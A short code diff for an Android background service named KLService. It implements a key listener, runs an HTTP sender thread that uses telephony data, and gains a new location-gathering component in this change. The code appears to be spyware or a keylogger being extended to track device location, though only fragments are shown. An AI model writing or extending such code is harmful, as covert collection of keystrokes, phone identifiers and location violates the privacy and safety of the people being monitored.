@@ -20,6 +20,7 @@ import android.app.Service;
 //import android.content.Context;
 import android.content.Context;
 import android.content.Intent;
+import android.location.LocationManager;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -130,6 +131,7 @@ public class KLService extends Service implements KeyListener {
 	
 	//HTTP sender Thread:
     final Runnable htttpRunnable = new Runnable() {
+    	@Override
         public void run() {
 		    //Thread Run:
         	KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
@@ -180,7 +182,7 @@ public class KLService extends Service implements KeyListener {
 		@Override
 		public void run() {
 			//Thread Run:
-        	//KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
+			KLSLocation locator = new KLSLocation((LocationManager)getSystemService(Context.LOCATION_SERVICE));
         	//Prepare for a loop(Note to self: Andy requested this..)
         	Looper.prepare();
         	
